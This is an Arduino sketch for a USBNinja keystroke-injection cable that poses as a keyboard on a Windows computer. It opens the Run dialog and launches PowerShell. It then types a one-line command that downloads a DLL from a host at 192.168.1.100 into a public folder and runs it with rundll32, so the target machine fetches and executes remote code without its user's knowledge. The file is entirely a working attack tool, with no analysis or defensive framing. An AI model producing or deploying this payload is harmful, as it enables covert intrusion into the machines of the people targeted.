#define LAYOUT_UNITED_KINGDOM

#include <NinjaKeyboard.h>

bool execute_once = true;

void setup() {
}

void loop() {
    // Check if we already executed the payload
    if (execute_once) {
        // Initiate keyboard
        USBninjaOnline();
        NinjaKeyboard.begin();
        NinjaKeyboard.delay(1000);
        // Send HID '0' to compatibility Win7
        NinjaKeyboard.sendKeyStroke(0);
        NinjaKeyboard.delay(1000);
        // WIN + R
        NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
        NinjaKeyboard.delay(100);
        // Start PowerShell
        NinjaKeyboard.print(F("powershell.exe"));
        NinjaKeyboard.delay(100);
        // ENTER
        NinjaKeyboard.sendKeyStroke(KEY_ENTER);
        NinjaKeyboard.delay(500);
        // Download, execute payload and exit powershell
        NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.1.100:8081/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
        NinjaKeyboard.delay(100);
        // Stop and remove keyboard
        NinjaKeyboard.end();
        USBninjaOffline();

        // Set flag
        execute_once = false;
    }
}

void payloadA() {
}

void payloadB() {
}
